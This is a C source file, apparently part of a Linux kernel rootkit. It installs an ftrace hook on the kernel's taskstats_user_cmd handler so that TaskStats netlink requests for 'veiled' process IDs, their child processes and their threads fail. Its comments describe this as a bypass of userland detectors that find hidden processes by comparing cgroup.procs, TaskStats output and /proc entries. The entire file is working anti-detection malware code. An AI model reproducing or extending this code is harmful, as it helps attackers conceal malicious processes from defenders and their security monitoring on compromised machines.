/*
 * TaskStats Netlink Hook (Anti-Detection)
 *
 * Certain userland detectors leverage TaskStats (TASKSTATS netlink)
 * to uncover hidden processes.
 *
 * The detection logic is simple: if a PID is present in cgroup.procs
 * and TaskStats successfully returns statistics for it, but
 * /proc/<pid> is missing, the process is classified as hidden.
 *
 * So for bypass this, we need to hook the taskstats_user_cmd and deliberately 
 * fail requests targeting concealed PIDs, preventing userland tools
 * from correlating TaskStats output with non-existent /proc entries.
 */

#include "../include/ub_core.h"
#include "../ftrace/hook_engine.h"
#include "../include/veiled_pids.h"
#include "../include/task.h"

static int (*ub_real_taskstats_user_cmd)(struct sk_buff *skb, struct genl_info *info);

static notrace bool is_pid_hidden_ts(pid_t pid)
{
    if (pid <= 0)
        return false;

    return ub_is_veiled(pid) || ub_is_offspring(pid) || ub_pid_is_thread(pid);
}

static notrace int ub_hook_taskstats_user_cmd(struct sk_buff *skb, struct genl_info *info)
{
    pid_t pid = 0;
    
    if (!ub_real_taskstats_user_cmd)
        return -EINVAL;
    
    if (!info)
        return ub_real_taskstats_user_cmd(skb, info);
    
    if (info->attrs) {
        if (info->attrs[TASKSTATS_CMD_ATTR_PID]) {
            pid = nla_get_u32(info->attrs[TASKSTATS_CMD_ATTR_PID]);
        }
        else if (info->attrs[TASKSTATS_CMD_ATTR_TGID]) {
            pid = nla_get_u32(info->attrs[TASKSTATS_CMD_ATTR_TGID]);
        }
    }
    
    if (pid > 0 && is_pid_hidden_ts(pid)) {
        return -ESRCH;
    }
    
    return ub_real_taskstats_user_cmd(skb, info);
}

static struct ftrace_hook taskstats_hooks[] = {
    HOOK("taskstats_user_cmd", ub_hook_taskstats_user_cmd, &ub_real_taskstats_user_cmd),
};

notrace int ub_taskguard_start(void)
{
    return ub_fh_install_hooks(taskstats_hooks, ARRAY_SIZE(taskstats_hooks));
}

notrace void ub_taskguard_stop(void)
{
    ub_fh_remove_hooks(taskstats_hooks, ARRAY_SIZE(taskstats_hooks));
}
